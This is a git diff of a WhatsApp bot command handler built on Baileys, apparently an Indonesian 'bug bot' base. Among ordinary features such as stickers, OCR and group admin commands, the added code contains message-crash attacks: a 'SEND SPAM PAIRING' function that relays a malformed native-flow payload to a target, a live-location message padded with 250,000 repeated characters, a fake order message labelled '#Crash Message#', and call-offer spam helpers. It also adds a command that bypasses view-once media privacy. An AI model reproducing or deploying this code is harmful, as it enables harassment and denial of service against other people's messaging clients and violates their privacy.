@@ -21,7 +21,6 @@ console.clear();
 //SCANING CONTROL
 
 require('../Control/Ctrl')
-
 //END
 //INSTALLING BAILEYS
 
@@ -107,14 +106,17 @@ const chalk = require('chalk')
 const os = require('os')
 const axios = require('axios')
 const fsx = require('fs-extra')
-const sharp = require('sharp');
+const sharp = require('sharp')
 const crypto = require('crypto')
+const yts = require('yt-search')
 const ffmpeg = require('fluent-ffmpeg')
 const speed = require('performance-now')
 const timestampp = speed();
 const latensi = speed() - timestampp
 const moment = require('moment-timezone')
 const jsobfus = require('javascript-obfuscator');
+const { VocalRemover } = require('../System/Data8');
+const { ocrSpace } = require("ocr-space-api-wrapper");
 const { JSDOM } = require('jsdom')
 
 //END
@@ -122,27 +124,24 @@ const { JSDOM } = require('jsdom')
 
 module.exports = TamaRYC = async (TamaRYC, m, chatUpdate, store) => {
     try {
-        var body = (m.mtype === 'conversation') ? m.message.conversation :
-                   (m.mtype == 'imageMessage') ? m.message.imageMessage.caption :
-                   (m.mtype == 'videoMessage') ? m.message.videoMessage.caption :
-                   (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text :
-                   (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
-                   (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
-                   (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId :
-                   (m.mtype === 'messageContextInfo') ? 
-                       (m.message.buttonsResponseMessage?.selectedButtonId || 
-                        m.message.listResponseMessage?.singleSelectReply.selectedRowId || 
-                        m.text) : '';
-
+      var body = (
+      m.mtype === "conversation" ? m.message.conversation :
+      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
+      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
+      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
+      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
+      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
+      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
+      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
+      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
+);
         var budy = (typeof m.text == 'string' ? m.text : '');
         var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                         body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                       : global.prefa ?? global.prefix
-
-
+  
 //END
 //DATA TAMBAHAN + PELENGKAP
-	    
 const { 
 smsg, 
 tanggal, 
@@ -172,19 +171,47 @@ const args = body.trim().split(/ +/).slice(1)
 const BotNum = await TamaRYC.decodeJid(TamaRYC.user.id)
 const DevOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+const fatkuns = m.quoted || m;
+const quoted = 
+  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
+  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
+  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
+  m.quoted ? m.quoted :
+  m;
 const qtext = q = args.join(" ")
-const quoted = m.quoted ? m.quoted : m
+const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
 const from = mek.key.remoteJid
 const { spawn: spawn, exec } = require('child_process')
 const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const groupMetadata = m.isGroup ? await TamaRYC.groupMetadata(from).catch(e => {}) : ''
+const groupName = m.isGroup ? groupMetadata.subject : "";
 const participants = m.isGroup ? await groupMetadata.participants : ''
 const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
 const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
 const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
 const pushname = m.pushName || "No Name"
-const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
+const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
+let ucapanWaktu
+if (time >= "19:00:00" && time < "23:59:00") {
+ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
+} else if (time >= "15:00:00" && time < "19:00:00") {
+    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
+} else if (time >= "11:00:00" && time < "15:00:00") {
+ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
+} else if (time >= "06:00:00" && time < "11:00:00") {
+    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
+} else {
+    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
+};
+const todayDateWIB = new Date().toLocaleDateString('id-ID', {
+  timeZone: 'Asia/Jakarta', // Zona waktu WIB
+  year: 'numeric',
+  month: 'long',
+  day: 'numeric',
+});
 const mime = (quoted.msg || quoted).mimetype || ''
+const THM = "https://files.catbox.moe/id76qx.jpg"
+const Xxx = "https://pomf2.lain.la/f/5l5eayi.jpg"
 
 //END
 //DATA TIKTOK SCRAPER
@@ -203,6 +230,14 @@ writeExif,
 addExif 
 } = require('../System/Data2')
 
+//DATA ADDBOT / JADIBOT PAIRING
+
+const {
+	jadibot,
+	stopbot,
+	listbot
+} = require('../Connection/jadibot')
+
 //END
 //SEETINGS STATUS BOT
 
@@ -214,14 +249,30 @@ if (!DevOnly) return
 //INFO NEW MESSAGE IN CONSOLE
 
 if (command) {
-console.log(chalk.hex('#3498db').bgHex('#f39c12').bold(`━━━━ ⌜ SYSTEM ⌟ ━━━━`));
-console.log(chalk.bgHex('#2980b9').hex('#fefefe').bold(`
-📅 DATE        : ${time}
-💬 INPUT MSG   : ${command}
-📜 OUTPUT MSG  : ${m.body || m.mtype} \n
-🗣️ SENDER      : ${pushname}
-👤 RECIPIENT   : ${m.sender}
-`));
+  if (m.isGroup) {
+    // Log untuk pesan grup
+    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
+    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
+      ` 📅 Date : ${todayDateWIB} \n` +
+      ` 🕐 Clock : ${time} \n` +
+      ` 💬 Message Received : ${m.mtype} \n` +
+      ` 🌐 Group Name : ${groupName} \n` +
+      ` 🔑 Group Id : ${m.chat} \n` +
+      ` 👤 Recipient : ${BotNum} \n`
+    ));
+  } else {
+    // Log untuk pesan privat
+    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
+    console.log(chalk.bgHex('#f39c12').hex('#ffffff').bold(
+      ` 📅 Date : ${todayDateWIB} \n` +
+      ` 🕐 Clock : ${time} \n` +
+      ` 💬 Message Received : ${m.mtype} \n` +
+      ` 🗣️ Sender : ${pushname} \n` +
+      ` 🌐 Group Name : No In Group \n` +
+      ` 🔑 Group Id : No In Group \n` +
+      ` 👤 Recipient : ${BotNum} \n`
+    ));
+  }
 }
 
 //END
@@ -295,8 +346,50 @@ reject(e)
 }
 
 //END
-//BUTTON MESSAGE ( NOT WORK )
+//SEND SPAM PAIRING
 
+async function SendPairing(isTarget, Ptcp = false) {
+			await TamaRYC.relayMessage(isTarget, {
+					viewOnceMessage: {
+						message: {
+								nativeFlowResponseMessage: {
+									"status":true,
+                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
+							}
+						}
+					}
+				},
+				ptcp ? {
+					participant: {
+						jid: isTarget
+					}
+				} : {}
+			);
+};
+//END
+//SEND CALL
+
+async function sendOfferCall(isTarget) {
+    try {
+        await TamaRYC.offerCall(isTarget);
+        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
+    } catch (error) {
+        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
+    }
+}
+
+async function sendOfferVideoCall(isTarget) {
+    try {
+        await TamaRYC.offerCall(isTarget, { 
+        video: true 
+        });
+        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
+    } catch (error) {
+        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
+    }
+}
+//END
+//BUTTON MESSAGE ( NOT WORK )
 TamaRYC.sendButton = async (jid, buttons, quoted, opts = {}) => {
       let message = generateWAMessageFromContent(jid, {
          viewOnceMessage: {
@@ -328,8 +421,7 @@ TamaRYC.sendButton = async (jid, buttons, quoted, opts = {}) => {
 //THUMBNAIL LINK + QUOTED MESSAGE
 
 const ThumbUrl = "https://pomf2.lain.la/f/5l5eayi.jpg"
-const Xxx = "https://pomf2.lain.la/f/5l5eayi.jpg"
-const xXx = {
+const XQuoted = {
 			key: {
 				fromMe: false,
 				participant: `0@s.whatsapp.net`,
@@ -353,14 +445,105 @@ const xXx = {
 				}
 			}
 		}
+		const xXxX = {
+			key: {
+				fromMe: false,
+				participant: `0@s.whatsapp.net`,
+				...(from ? {
+					remoteJid: "@s.whatsapp.net"
+				} : {})
+			},
+			"message": {
+				"orderMessage": {
+					"orderId": "594071395007984",
+					"thumbnail": { "url": "https://pomf2.lain.la/f/5l5eayi.jpg" },
+					"itemCount": 2009,
+					"status": "INQUIRY",
+					"surface": "CATALOG",
+					"message": `! #Crash Message# !`,
+					"orderTitle": " TamaRyuichi",
+					"sellerJid": "6285727819741@s.whatsapp.net",
+					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+					"totalAmount1000": "2009",
+					"totalCurrencyCode": "IDR"
+				}
+			}
+		}
+
+//END
+//START NEW FUNCTION
+async function livelocnew(isTarget, ptcp = false) {
+let BoomText = "My Location, Come Here!!!" + "ꦾ".repeat(250000);
+
+const messageContent = {
+    ephemeralMessage: {
+        message: {
+            viewOnceMessage: {
+                message: {
+                    liveLocationMessage: {
+                        degreesLatitude: 0,
+                        caption: BoomText,
+                        sequenceNumber: "",
+                        jpegThumbnail: null
+                    },
+                    body: {
+                        text: BoomText
+                    },
+                    nativeFlowMessage: {}, // If needed, specify more details here
+                    contextInfo: {
+                     contactVcard: true,
+                        mentionedJid: [m.chat],
+                        groupMentions: [
+                            { 
+                                groupJid: "@120363321780343299@g.us", 
+                                groupSubject: "TAMARYUICHI" 
+                            }
+                        ]
+                    }
+                }
+            }
+        }
+    }
+};
+
+// Generate the WA message based on the content
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject(messageContent), {
+    userJid: m.chat, 
+    quoted: QuotedGalaxy // Ensure this is defined or passed correctly
+});
+
+// Send the generated message
+ TamaRYC.relayMessage(m.chat, etc.message, {
+    participant: { jid: m.chat }, 
+    messageId: etc.key.id
+});
+}
+//END
+//REPLY MESSAGE
+const ReplyImage = (teks) => {
+    return TamaRYC.sendMessage(m.chat, {
+        text: teks,
+        contextInfo: {
+            externalAdReply: {
+                showAdAttribution: true,
+                title: `T-Яyuichi ( RIYU )`,
+                body: `Finix Always With You`,
+                mediaType: 3,
+                renderLargerThumbnail: false,
+                thumbnailUrl: ThumbUrl,
+                sourceUrl: `https://youtube.com/@tamainfinity`
+            }
+        }
+    }, { quoted: m });
+}
 const Reply1 = (teks) => {
     return TamaRYC.sendMessage(m.chat, {
         image: {
-            url: "https://pomf2.lain.la/f/uktly3a5.jpg"
+            url: "https://files.catbox.moe/id76qx.jpg"
         },
         caption: teks,
         gifPlayback: false
-    }, { quoted: xXx });
+    }, { quoted: m });
 }
 
 //END
@@ -403,12 +586,12 @@ async function makeStickerFromUrl(imageUrl, TamaRYC, m) {
                     sourceUrl: `https://youtube.com/@tamainfinity`
                 }
             }
-        }, { quoted: xXx });
+        }, { quoted: m });
 
         fs.unlinkSync(fileName);
     } catch (error) {
         console.error("Error creating sticker:", error);
-        Reply1('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
+        m.reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
     }
 }
 
@@ -421,90 +604,17 @@ return arr[Math.floor(Math.random() * arr.length)]
 switch(command) {
 //ALL MENU CASE {
 case 'menu': 
-case '^': {
-    let Menu = ` ENJOY USE MY BASE 🐱
-    > Tama Ryuichi
-`
+case 'help': {
+let Menu = `
+ISI TAMPILAN MENU SENDIRI
+` 
     TamaRYC.sendMessage(m.chat, {
-    image: {
-url: "https://pomf2.lain.la/f/uktly3a5.jpg" 
-    },
-    caption: Menu,
-    giffPlayback: false
-}, { quoted: xXx });
-
-}
-break
-
-//BUG CASE
-
-case 'bugmenu': 
-case '2': {
-    let BugMenu = `
-ENJOY USE MY BASE 🐱
-    > Tama Ryuichi
-`
-TamaRYC.sendMessage(m.chat, {
-    image: {
-url: "https://pomf2.lain.la/f/uktly3a5.jpg" 
-    },
-    caption: BugMenu,
-    giffPlayback: false
-}, { quoted: xXx });
-}
-break
-
-//OWNER CASE
-
-case 'ownermenu': 
-case '3': {
-let OwnMenu = `
-ENJOY USE MY BASE 🐱
-    > Tama Ryuichi
-`
-TamaRYC.sendMessage(m.chat, {
-    image: {
-url: "https://pomf2.lain.la/f/uktly3a5.jpg" 
-    },
-    caption: OwnMenu,
-    giffPlayback: false
-}, { quoted: xXx });
-}
-break
-
-//GROUP CASE
-
-case 'groupmenu': 
-case '4': {
-let GCMenu = `
-ENJOY USE MY BASE 🐱
-    > Tama Ryuichi
-`
-TamaRYC.sendMessage(m.chat, {
-    image: {
-url: "https://pomf2.lain.la/f/uktly3a5.jpg" 
-    },
-    caption: GCMenu,
-    giffPlayback: false
-}, { quoted: xXx });
-}
-break
-
-// OTHER CASE
-
-case 'othermenu':
-case '5': {
-let OtherMenu = `
-ENJOY USE MY BASE 🐱
-    > Tama Ryuichi
-`
-TamaRYC.sendMessage(m.chat, {
-    image: {
-url: "https://pomf2.lain.la/f/uktly3a5.jpg" 
-    },
-    caption: OtherMenu,
-    giffPlayback: false
-}, { quoted: xXx });
+        image: {
+            url: "https://files.catbox.moe/id76qx.jpg"
+        },
+        caption: teks,
+        gifPlayback: false
+    }, { quoted: m });
 }
 break
 
@@ -512,24 +622,24 @@ break
 //ACCESS CASE
 
 case 'addowner': case 'addown':
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!args[0]) return Reply1(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
+if (!DevOnly) return 
+  if (!args[0]) return m.reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
   numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
   let loadnum = await TamaRYC.onWhatsApp(numero + `@s.whatsapp.net`);
-  if (loadnum.length == 0) return Reply1(`Number Invalid!!!`);
+  if (loadnum.length == 0) return m.reply(`Number Invalid!!!`);
   owner.push(numero);
   Premium.push(numero);
   fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
   fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
-  Reply1(`Number ${numero} succes add to database!`);
+  m.reply(`Number ${numero} succes add to database!`);
   break;
 
 //END
 //ACCESS CASE
 
 case 'delowner': case 'delown':
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!args[0]) return Reply1(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62xxx`);
+if (!DevOnly) return 
+  if (!args[0]) return m.reply(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62xxx`);
   numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
   numeroX = Owner.indexOf(numero2);
   numload = Premium.indexOf(numero2);
@@ -537,41 +647,41 @@ case 'delowner': case 'delown':
   Premium.splice(numload, 1);
   fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
   fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
-  Reply1(`Number ${numero2} succes delate to database!`);
+  m.reply(`Number ${numero2} succes delate to database!`);
   break;
 
 //END
 //ACCESS CASE
 
 case 'addpremium': case 'addprem':
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!args[0]) return Reply1(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
+if (!DevOnly) return 
+  if (!args[0]) return m.reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
   numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
   let Invalid = await TamaRYC.onWhatsApp(numero + `@s.whatsapp.net`);
-  if (Invalid.length == 0) return Reply1(`Number Invalid!!!`);
+  if (Invalid.length == 0) return m.reply(`Number Invalid!!!`);
   Premium.push(numero);
   fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
-  Reply1(`Number ${numero} succes add to database!`);
+  m.reply(`Number ${numero} succes add to database!`);
   break
   
 //END
 //ACCESS CASE
 
 case 'delpremium': case 'delprem':
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!args[0]) return Reply1(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
+if (!DevOnly) return 
+  if (!args[0]) return m.reply(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
   numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
   numeroX = Premium.indexOf(numero2);
   Premium.splice(numeroX, 1);
   fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
-  Reply1(`Number ${numero2} succes delate to database!`);
+  m.reply(`Number ${numero2} succes delate to database!`);
   break;
 
 //END
 //QC CASE
 
 case 'qc': {
-  if (!q) return Reply1(`Send command with text. ${prefix + command} Tams Ryuichi`);
+  if (!q) return m.reply(`Send command with text. ${prefix + command} TamaRYC`);
   let obj = {
     type: 'quote',
     format: 'png',
@@ -601,18 +711,76 @@ case 'qc': {
     },
   });
   let buffer = Buffer.from(response.data.result.image, 'base64');
-  TamaRYC.sendImageAsSticker(m.chat, buffer, xXx, { packname: `${global.packname}`, author: `${global.author}` });
+  TamaRYC.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
 }
 break;
+
+//END
+//PLAY CASE
+
+case "play": {
+        if (!qtext) return m.reply(`send title song\n example ${prefix + command} ransom`);
+        let search = await yts(qtext);
+        let telaso = search.all[0].url;
+        let puqi = await VocalRemover(telaso);
+          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
+          TamaRYC.sendMessage(m.chat, {
+              audio: { url : vocalAudio },
+              mimetype: 'audio/mpeg', 
+              ptt: true
+          },{ quoted:m })
+        }
+      break
+      
+//END
+//RVO CASE
+
+case "rvo":
+case "readvo":
+case 'readviewonce':
+case 'readviewoncemessage': {
+
+  if (!m.quoted) return m.reply("Reply to an image/video that you want to view");
+  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
+    return m.reply("This is not a view-once message.");
+
+  let msg = m.quoted.message;
+  let type = Object.keys(msg)[0];
+
+  if (!["imageMessage", "videoMessage"].includes(type)) {
+    return m.reply("The quoted message is not an image or video.");
+  }
+
+  // Download media content
+  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");
+
+  let bufferArray = [];
+  for await (const chunk of media) {
+    bufferArray.push(chunk);
+  }
+  let buffer = Buffer.concat(bufferArray);
+
+  // Send media according to type (image or video)
+  if (type === "videoMessage") {
+    await TamaRYC.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
+  } else if (type === "imageMessage") {
+    await TamaRYC.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
+  }
+  await TamaRYC.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
+}
+break
 
 //END
 //SETPP CASE
 
 case "setpp": {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!q) {
-    const media = await TamaRYC.downloadAndSaveMediaMessage(!q);
+  if (!DevOnly) return 
+  if (!m.quoted) return m.reply("Reply to an image with this command to set profile picture!");
+  
+  try {
+    const media = await TamaRYC.downloadAndSaveMediaMessage(m.quoted);
     const { img } = await generateProfilePicture(media);
+
     await TamaRYC.query({
       tag: "iq",
       attrs: {
@@ -628,20 +796,21 @@ case "setpp": {
         content: img
       }]
     });
-    await Reply1("Success Set Profile Picture");
-  } else {
-    Reply1("Reply Image!!");
+
+    await m.reply("Profile picture set successfully!");
+  } catch (error) {
+    console.error(error);
+    await m.reply("Failed to set profile picture. Make sure you replied to an image and try again.");
   }
 }
 break
-
 //END
 //DELETE PP CASE
 
 case "delpp": {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
+if (!DevOnly) return 
   TamaRYC.removeProfilePicture(TamaRYC.user.id);
-  Reply1("Success Delete Profile Picture");
+  m.reply("Success Delete Profile Picture");
 }
 break;
 
@@ -649,14 +818,14 @@ break;
 //TOVN CASE
 
 case 'tovn': {
-  if (!/video/.test(mime) && !/audio/.test(mime)) return Reply1(`Reply media with caption ${prefix + command}`);
-  if (!quoted) return Reply1(`Reply video/vn with caption ${prefix + command}`);
+  if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply media with caption ${prefix + command}`);
+  if (!quoted) return m.reply(`Reply video/vn with caption ${prefix + command}`);
   
   let media = await quoted.download();
   let { toAudio } = require('../System/Data4');
   let audio = await toAudio(media, 'mp4');
   
-  TamaRYC.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: xXx });
+  TamaRYC.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
 }
 break;
 
@@ -664,10 +833,9 @@ break;
 //HIDETAG CASE
 
 case 'hidetag': {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!m.isGroup) return Reply1("Features can be accessed in group only");
-
-  TamaRYC.sendMessage(from, { text: q ? q : 'Finix Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: xXx });
+  if (!DevOnly) return 
+  if (!m.isGroup) return 
+  TamaRYC.sendMessage(from, { text: q ? q : 'Finix Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
 }
 break;
 
@@ -675,13 +843,13 @@ break;
 //KICK CASE
 
 case 'kick': {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!m.isGroup) return Reply1("Features can be accessed in group only");
-  if (!BotAdm) return Reply1("Features can be accessed by bot admin only");
-  if (!Adm) return Reply1("Features can be accessed by Admin only");
+if (!DevOnly) return 
+  if (!m.isGroup) return 
+  if (!BotAdm) return  
+  if (!Adm) return 
 
   let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-  if (!q) return Reply1("Send number / tag users ");
+  if (!q) return m.reply("Send number / tag users ");
   await TamaRYC.groupParticipantsUpdate(from, [users], 'remove');
 }
 break;
@@ -690,9 +858,9 @@ break;
 //GET LINK GROUP
 
 case 'linkgroup': case 'linkgc': {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!m.isGroup) return Reply1("Features can be accessed in group only");
-  if (!BotAdm) return Reply1("Features can be accessed by bot admin");
+  if (!DevOnly) return 
+  if (!m.isGroup) return 
+  if (!BotAdm) return  
 
   let responsegg = await TamaRYC.groupInviteCode(from);
   TamaRYC.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
@@ -703,10 +871,10 @@ break;
 //RESET LINK GC CASE
 
 case 'resetlinkgc': {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
-  if (!m.isGroup) return Reply1("Features can be accessed in group only");
-  if (!BotAdm) return Reply1("Features can be accessed by bot admin");
-
+  if (!DevOnly) return 
+  if (!m.isGroup) return 
+  if (!BotAdm) return  
+  
   TamaRYC.groupRevokeInvite(from);
 }
 break;
@@ -715,13 +883,9 @@ break;
 //CONTROL CASE
 
 case 'public': {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
+  if (!DevOnly) return 
   TamaRYC.public = true;
-  Reply1(`
-    ⌜ *Information Bot Mode* ⌟
-    - Public Mode : _True_
-    - Self Mode : _False_
-  `);
+  m.reply(`*Success Change Mode Self To Public*`);
 }
 break;
 
@@ -729,34 +893,84 @@ break;
 //CONTROL CASE
 
 case 'self': case 'private': {
-  if (!DevOnly) return Reply1("Features can be accessed by Developers/Owner only");
+  if (!DevOnly) return
   TamaRYC.public = false;
-  Reply1(`
-    ⌜ *Information Bot Mode* ⌟
-    - Public Mode : _False_
-    - Self Mode : _True_
-  `);
+  m.reply(`*Success Change Mode Public To Self*`);
 }
 break;
+
+//END
+//OCR CASE
+case 'ocr': {
+
+  let q = m.quoted ? m.quoted : m;
+  let mime = (q.msg || q).mimetype || "";
+  if (!mime) return m.reply("Send / Reply Image");
+  if (!/image\/(jpe?g|png)/.test(mime))
+    return m.reply(`Tipe ${mime} tidak didukung!`);
+  let image = await q.download();
+  let download = await TamaRYC.getFile(image, true);
+  let ocr = await ocrSpace(download.filename);
+  await TamaRYC.sendMessage(
+    m.chat,
+    { text: ocr.ParsedResults[0].ParsedText.trim() },
+    { quoted: m },
+  );
+}
+break
+//END
+//TOURL CASE
+
+case 'tourl': {    
+    let q = m.quoted ? m.quoted : m;
+    if (!q || !q.download) return m.reply(`Reply to an Image or Video with command ${prefix + command}`);
+    
+    let mime = q.mimetype || '';
+    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
+        return m.reply('Only images or MP4 videos are supported!');
+    }
+
+    let media;
+    try {
+        media = await q.download();
+    } catch (error) {
+        return m.reply('Failed to download media!');
+    }
+
+    const uploadImage = require('../System/Data6');
+    const uploadFile = require('../System/Data7');
+    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
+    let link;
+    try {
+        link = await (isTele ? uploadImage : uploadFile)(media);
+    } catch (error) {
+        return m.reply('Failed to upload media!');
+    }
+
+    TamaRYC.sendMessage(m.chat, {
+        text: `(no expiration date/unknown)\n ${link}`
+    }, { quoted: m });
+}
+break
 
 //END
 //STICKER CASE
 
 case 'sticker': case 's': {
-  if (!quoted) return Reply1(`Reply Image or Video with command ${prefix + command}`);
+  if (!quoted) return m.reply(`Reply Image or Video with command ${prefix + command}`);
   
   if (/image/.test(mime)) {
     let media = await quoted.download();
     let encmedia = await TamaRYC.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
     await fs.unlinkSync(encmedia);
   } else if (/video/.test(mime)) {
-    if ((quoted.msg || quoted).seconds > 11) return Reply1('max 10s');
+    if ((quoted.msg || quoted).seconds > 11) return m.reply('max 10s');
     
     let media = await quoted.download();
     let encmedia = await TamaRYC.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
     await fs.unlinkSync(encmedia);
   } else {
-    return Reply1(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
+    return m.reply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
   }
 }
 break;
@@ -764,40 +978,17 @@ break;
 //BRAT CASE
 
 case 'brat': {
-            if (!q) return Reply1(`Send command with text. ${prefix + command} Tama Ryuichi`)
+            if (!q) return m.reply(`Send command with text. ${prefix + command} Tama Ryuichi`)
             const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
             await makeStickerFromUrl(imageUrl, TamaRYC, m);
         }
        break
-//ISI CASE BUG SENDIRI YA BRE🐱
-
-
 
 //END
 //TES BOT CASE
-
-case 'runtime':
+case 'tes':
 case 'status': {
-Reply1(`
- *<Status Bot>*
-- Finix Bot : _Actived_
-- Runtime : ${RunTime}
-- time : _${time}_
-`)
-}
-break
-
-//END
-//THANKS TO CASE
-
-case 'tqto':
-case '1': {
-Reply1(`
- *<Thanks To>*
-- Allah : _My God_
-- Tama / Riyu : _Creator Base_
-- FleX Agency : _My Team_
-`)
+m.reply(`*Finix bot is ready to use*`)
 }
 break
 
@@ -806,7 +997,7 @@ break
 
 case 'tiktok': 
       case'tt':{
-        if (!qtext) return Reply1(`Send command with link. ${prefix + command} https://`);
+        if (!qtext) return m.reply(`Send command with link. ${prefix + command} https://`);
